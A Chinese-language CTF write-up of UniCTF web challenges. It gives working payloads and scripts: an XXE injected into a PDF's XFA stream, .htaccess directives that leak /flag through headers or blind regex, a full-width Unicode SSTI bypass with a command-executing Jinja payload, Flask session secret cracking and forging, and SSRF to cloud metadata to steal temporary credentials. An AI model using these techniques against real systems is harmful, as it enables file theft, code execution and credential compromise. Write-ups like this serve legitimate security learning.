## SecureDoc
这一关可以上传pdf文件，下面提示是基于XFA，而XFA本质上就是XML，所以这应该是一个XXE漏洞。
只需要构造一个最简的pdf文件。包含
```
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Count 1
/Kids [3 0 R]
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
  /XObject <<
    /XFA 5 0 R
  >>
>>
>>
endobj

4 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
72 720 Td
(Test) Tj
ET
endstream
endobj

5 0 obj
<< /Length 300 >>
stream
<?xml version="1.0"?>
<!DOCTYPE xxe [
  <!ENTITY payload SYSTEM "file:///flag">
]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
    <xfa:data>&payload;</xfa:data>
  </xfa:datasets>
</xdp:xdp>
endstream
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000079 00000 n
0000000149 00000 n
0000000304 00000 n
0000000415 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
600
%%EOF

```
把这个保存为pdf文件就可以了，上传后就得到flag。(如果要读取其他文件，只需要修改路径并且重新计算Length)
题目说是一个PDF的解析器，随便传一个PDF，弹出来的页面显示未在文件中找到XFA
**XFA**是一种基于 **XML** 的技术规范，主要用于在 **PDF 文档** 中创建、渲染和处理复杂的、动态的交互式表单，既然是XML格式的文本，自然能想到XXE，这里使用脚本为PDF注入XFA
也可以写脚本构造
```python
import PyPDF2
import sys

def inject_xfa_to_pdf(input_pdf, output_pdf, xfa_xml):
    # 读取原始PDF
    with open(input_pdf, 'rb') as f:
        reader = PyPDF2.PdfReader(f)
        writer = PyPDF2.PdfWriter()

        # 复制所有页面
        for page in reader.pages:
            writer.add_page(page)

        # 创建XFA数据流 - 新版PyPDF2方式
        from PyPDF2.generic import DecodedStreamObject, NameObject, ArrayObject, DictionaryObject

        # 方法1: 使用DecodedStreamObject
        xfa_stream = DecodedStreamObject()
        xfa_stream._data = xfa_xml.encode()  # 直接设置_data属性

        # 方法2: 或者使用encoded属性
        # xfa_stream.encoded_data = xfa_xml.encode()

        # 添加到writer
        xfa_ref = writer._add_object(xfa_stream)

        # 创建AcroForm字典
        acroform = DictionaryObject({
            NameObject('/Fields'): ArrayObject(),
            NameObject('/XFA'): xfa_ref
        })

        # 设置Catalog
        writer._root_object.update({
            NameObject('/AcroForm'): acroform
        })

        # 确保有Catalog对象
        if '/Catalog' not in writer._root_object:
            catalog = DictionaryObject()
            writer._root_object[NameObject('/Catalog')] = catalog

        # 写入文件
        with open(output_pdf, 'wb') as out_f:
            writer.write(out_f)

# 测试XFA XML
evil_xfa = '''<?xml version="1.0"?>
<!DOCTYPE xdp [
<!ENTITY xxe SYSTEM "file://flag">
]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
    <template>
    <subform name="form1">
    <field name="exploit">&xxe;</field>
    </subform>
</template>
</xdp:xdp>'''

try:
    inject_xfa_to_pdf('writeup.pdf', 'evil.pdf', evil_xfa)
    print("成功创建恶意PDF: evil.pdf")
except Exception as e:
    print(f"错误: {e}")

```
## ezUpload & ezUpload Revenge
限制文件大小1kb，禁止了
```
?$&;`\< 和php代码
```
且权限控制比较严格，访问`/upload`路由会报`Access Denied`因为是Apache服务器，就考虑到是要上传`.htaccess`文件。
可以用响应头回显
```
Options +Indexes
DirectoryIndex /test.txt
Header set X-Flag "expr=%{file:/flag}"
```
`Options +Indexes`用于开放索引，允许客户端查看目录结构，用于应付权限控制
`DirectoryIndex /test.txt`设置默认索引，用于在客户端访问`/upload`路由时展示的默认文件，这里`/test.txt`是从网站的根目录算起，如果没有该文件就会展示目录结构
`Header set X-Flag "expr=%{file:/flag}"`用于设置响应头，expr表达式`%{file:/flag}`表示将/flag文件内容贴入`X-Flag`这个响应头中
由于打开文件的expr表达式需要处理文件时才能触发，需要前两条去强迫apache寻找根目录下的test.txt文件，该文件实际存不存在不重要，主要是触发apache服务器的文件处理操作
上传成功后再次访问`/upload`路由，查看响应头
就会发现响应头里有`X-Flag`值就是flag。
或者可以
```
RewriteEngine On
RewriteCond expr "file('/flag') =~ /(.+)/"
RewriteRule .* - [E=FLAG_CONTENT:%1]
Header set X-Test-Expr "%{FLAG_CONTENT}e"
```
客户端请求任意界面，`RewriteEngine On`启用重写引擎，`RewriteCond expr`读取/flag文件，只有该条件满足时，后续的`RewriteRule`才会执行。
`=~`正则匹配运算符看左边的`/flag`是否匹配右面的正则表达式，
`/(.+)/`其中`(.+)`是捕获组，`+`匹配一个及以上任意字符（默认不包括换行），捕获内容存到%1这个变量中。
`RewriteRule .* - [E=FLAG_CONTENT:%1]`设置环境变量`FLAG_CONTENT=%1` 
`.*`是正则匹配模式，匹配任意url路径，
`-`目标位置为减号，是 Apache 的特殊用法，表示 “不修改 URL，仅执行`[]`中的标志操作”。
`Header set X-Test-Expr "%{FLAG_CONTENT}e"` header 指令设置响应头，X-Test-Exper=FLAG_CONTENT的值，之后只要随便提交一个符合要求的文件，再访问他，在响应包里就可以看到flag![](/image/341.png)
这道题还可以盲注，就是
```
RewriteEngine On
RewriteCond expr "file('/flag') =~ /^UniCTF{/"
RewriteRule ^readflag /upload/success [R=301,L]
```
其中`RewriteEngine On`开启了url重写，`/^UniCTF{/`的`^`是正则锚点，表示字符串的开头，也就是判断`/flag`文件是否以`UniCTF{`开头，如果是的话，就执行下面的语句，
`RewriteRule ^readflag /upload/success [R=301,L]`把任何以`readflag`结尾的请求，301重定向到`/upload/success`
脚本
```python
import requests  
import string  
  
session = requests.Session()  
session.proxies = {"http": None, "https": None}  
  
TARGET_URL = "http://80-226e60e4-c3c9-4801-ba9a-1899550fb4a0.challenge.ctfplus.cn/"  
TRIGGER_URL = TARGET_URL + "upload/readflag"  
  
alphabet = r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
flag = "UniCTF{"  
  
  
def solve():  
    global flag  
    while True:  
        for char in alphabet:  
            test_char = char  
            if char in ".+*?^$()[]{}|\\":  
                test_char = "\\" + char #这些特殊字符在正则里有特殊含义，需要加上  
  
            htaccess = f"""RewriteEngine On  
RewriteCond expr "file('/flag') =~ /^{flag}{test_char}/"  
RewriteRule ^readflag /upload/success [R=301,L]"""  
  
            try:  
                session.post(TARGET_URL, files={'file': ('.htaccess', htaccess)}, timeout=10)  
                r = session.get(TRIGGER_URL, allow_redirects=False, timeout=10)  
  
                print(f"\r测试中: {flag}{char}", end="")  
  
                if r.status_code == 301:  
                    flag += char  
                    print(f"\n[+] 命中! 目前 Flag: {flag}")  
                    if char == "}": return  
                    break            except Exception as e:  
                print(f"\n[!] 请求出错: {e}")  
                continue  
  
  
solve()
```


## 截取的线索
给了一个图片和一段内容
```
RinDSA|W6dlkbXsob
```
图片是一个`96*1`的灰度图，这很可能存储了信息，因为96bit == 12byte
也就是12个ascii字符。
可以转换成字符
```python
from PIL import Image  
  
img = Image.open("666.png").convert("L")  
pixels = list(img.getdata())  
print(len(pixels))  
print(pixels[:96])  
  
bits = ''.join('1' if p>0 else '0' for p in pixels)  
flag = ''  
for i in range(0,96,8):  
    byte =  bits[i:i+8]  
    flag += chr(int(byte,2))  
print(flag)
```
得到`_Great_to01}`这是flag后半部分。
再看`RinDSA|W6dlkbXsob`因为flag以`UniCTF{`开头，所以我想`RinDSA|`怎么变成了`UniCTF{`，看着不想字符偏移，像异或，但是异或要密钥（这个可以算），例如`密钥 = 密文 ^ 明文`
`print(ord("R")^ord("U"))`可以得到密钥为7，再用`cybershelf`解密得到`UniCTF{P1ckle_the`
拼接得到flag`UniCTF{P1ckle_the_Great_to01}`
## GlyphWeaver
题目有一句提示` Supports typography cleanup (CJK-friendly).`适配中日韩
明显是模板注入，但是却过滤了很多字符，连`{{}}`都过滤了，这里需要使用**全角字符绕过**，又称Unicode 标准化 (NFKC) 漏洞。在 Python 的 Web 环境中，为了处理全球各地的字符输入，后端常使用 `unicodedata.normalize('NFKC', input)` 来统一字符格式，所以我们可以将字符变成全角的从而绕过WAF，因为题目提示说支持多种字体，推测校验是在转换成标准格式之前
字符转换的脚本
```python
def to_full_width(text):  
    """将半角字符转换为全角字符"""  
    result = []  
    for char in text:  
        code = ord(char)  
        # 处理基本拉丁字母和数字  
        if 33 <= code <= 126:  # 可打印ASCII字符（不包括空格）  
            result.append(chr(code + 0xFEE0))  
        elif char == ' ':  # 半角空格转全角空格  
            result.append('　')  
        else:  
            result.append(char)  
    return ''.join(result)  
  
test_text = "{{lipsum.__globals__.__builtins__.open('/flag').read()}}"  
full_width_text = to_full_width(test_text)  
  
print("原文本:", test_text)  
print("全角文本:", full_width_text)  
print("长度对比:", len(test_text), "→", len(full_width_text))
```
这样就可以绕过WAF。

如果直接输入`{{7*7}}`会被WAF，如果用全角字符，`｛｛７＊７｝｝`就会被渲染成英文的`{{7*7}}`但是还没有成功，需要将他二次渲染，下面有一个导出功能，导出就会再渲染一次，这样就可以得到flag了![](/image/342.png)
## Intrasight
前端注释里有这样的提示
```
<!-- internal-services: [public_web, admin_panel, w*_*e*1*r] -->
```
说明有多个服务，可以扫描端口。
看127.0.0.1有几个存活端口。通过爆破，可以得知8001和9000端口是有东西的。![](/image/343.png)
8001
```
{
  "status": 404,
  "headers": {
    "content-type": "application/json",
    "x-service": "admin_panel"
  },
  "history": [],
  "body": {
    "detail": "Not Found"
  }
}
```
9000
```
{
  "status": 404,
  "headers": {
    "content-type": "application/json"
  },
  "history": [],
  "body": {
    "detail": "Not Found"
  }
}
```
扫描出端口后访问一下
`http://127.0.0.1:8001/openapi.json`这样就可以列出所有的api接口，或者可以爆破。
```
{
  "status": 200,
  "headers": {
    "content-type": "application/json",
    "x-service": "admin_panel"
  },
  "history": [],
  "body": {
    "openapi": "3.1.0",
    "info": {
      "title": "admin_panel",
      "version": "0.1.0"
    },
    "paths": {
      "/status": {
        "get": {
          "summary": "Status Page",
          "operationId": "status_page_status_get",
          "responses": {
            "200": {
              "description": "Successful Response",
              "content": {
                "application/json": {
                  "schema": {}
                }
              }
            }
          }
        }
      },
      "/api/debug/config": {
        "get": {
          "summary": "Debug Config",
          "operationId": "debug_config_api_debug_config_get",
          "responses": {
            "200": {
              "description": "Successful Response",
              "content": {
                "application/json": {
                  "schema": {}
                }
              }
            }
          }
        }
      },
      "/redirect_ws": {
        "get": {
          "summary": "Redirect Ws",
          "operationId": "redirect_ws_redirect_ws_get",
          "responses": {
            "200": {
              "description": "Successful Response",
              "content": {
                "application/json": {
                  "schema": {}
                }
              }
            }
          }
        }
      }
    }
  }
}
```
可以发现有`/status /api/debug/config /redirect_ws`并且8001开了管理员面板。
访问`http://127.0.0.1:8001/redirect_ws`可以发现一个token
```
"location": "ws://127.0.0.1:9000/ws?token=639515b13e354eb38fb59cb9b7e775ca"
```
就fetch一下
```
ws://127.0.0.1:9000/ws?token=639515b13e354eb38fb59cb9b7e775ca
```
可以得到
```
{
  "ws": "ok",
  "message": "handshake success",
  "welcome": "{\"error\":\"invalid origin 'None' ; X-Internal-Token header must match ?token; token expired or invalid (try /redirect_ws)\"}"
}
```
这里说缺少请求头`X-Internal-Token`和`origin`
那就补齐。
![](/image/344.png)
还有就是token是一次性的，用完一次得重新获取。
根据响应包里的提示，接下来应该是要SSTI了。
```
{
  "service": "IntraSight Template Preview",
  "version": "1.0",
  "protocol": {
    "action": "render",
    "template": "",
    "context": {"optional": ""}
  }
}
```
由此可知需要传入
```
{ "action": "render", "template": "{{7*7}}", "context": {"optional": ""} }
```
既可以渲染
![](/image/345.png)
可以SSTI,接下来就
```
{ "action": "render", "template": "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}", "context": {"optional": ""} }
```
![](/image/346.png)
## CloudDiag
注册成功再登录可以得到一个Cookie，
```
_clck=nextu4%5E2%5Eg3b%5E0%5E2117; _ga=GA1.1.2056596896.1770278847; _ga_BFDVYZJ3DE=GS2.1.s1770282132$o2$g0$t1770282132$j60$l0$h0; session=eyJib290X2lkIjoiMTc3MDI4NzI0NS4wMDc0NTkiLCJ1c2VyX2lkIjoyfQ.aYRwqw._6zjvEjHb7AXEOGbt7heJrPjVfo
```
这里的session可以看一下是否可以密钥爆破，
这是flag-session不是jwt，但是类似也可以解码，也需要密钥进行签名。可以用一个工具flask-unsign
```
D:\hexo\hexo-blog>flask-unsign --unsign --cookie "eyJib290X2lkIjoiMTc3MDI4NzI0NS4wMDc0NTkiLCJ1c2VyX2lkIjoyfQ.aYRxTw.lbI_Ev3I_Jko45fCs48oRIGU7Fc"
[*] Session decodes to: {'boot_id': '1770287245.007459', 'user_id': 2}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 43136 attemptsdcs$TGERWVSD
'dev-secret'
```
可以直接爆破出密钥。
我的id是2，推测管理员id是1,那就用密钥签名
```
D:\hexo\hexo-blog>flask-unsign --sign --cookie "{'boot_id': '1770287245.007459', 'user_id': 1}" --secret 'dev-secret'
eyJib290X2lkIjoiMTc3MDI4NzI0NS4wMDc0NTkiLCJ1c2VyX2lkIjoxfQ.aYRzoA.ZE6rOP5aaEow751KHRdIPtvDxLo
```
换成新的session。
变成了welcome root 
这里官方wp里写的是用弱口令爆破root密码。
root/root123
还有人进行十进制绕过`http://2130706433:1338/`
之后可以看到
```
Config URL: http://metadata:1338/latest/meta-data/iam/security-credentials/
```
从url特征看，应该是元数据，通过查询，发现这是AWS IMDSv1的典型路径，用于列出实例角色名，并且能推断出，其中返回的clouddiag-instance-role对应的就是题目中角色名，可以通过
```
http://metadata:1338/latest/meta-data/iam/security-credentials/<role-name>
```
的方式返回角色的临时凭证（AK/SK/Token）
暴露了元数据服务地址`http://metadata:1338/`，AWS元数据端点`/latest/meta-data/iam/security-credentials/`，IAM角色名`clouddiag-instance-role`
访问`http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role`获取临时凭证
```
{
  "AccessKeyId": "AKIAB2BCC760ECBA432D",
  "Code": "Success",
  "Expiration": "2026-02-05T11:08:26.943835Z",
  "SecretAccessKey": "718f692e6dce425994f740f8fb4f0056a03a46063c4b4b44bb6479d6d2d3b7d3",
  "Token": "aa9e332c6fb44802afea06286be04d6e562d8e45900540018ead27b1ad995fa4",
  "Type": "AWS-HMAC"
}
```
把这依次填进Cloud Explorer`
在依次根据提示填好剩下几个。
## 










## 参考文章
https://leyi.live/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/
https://my.feishu.cn/wiki/IKuswoKxMicfzekbjklcxNLMn2b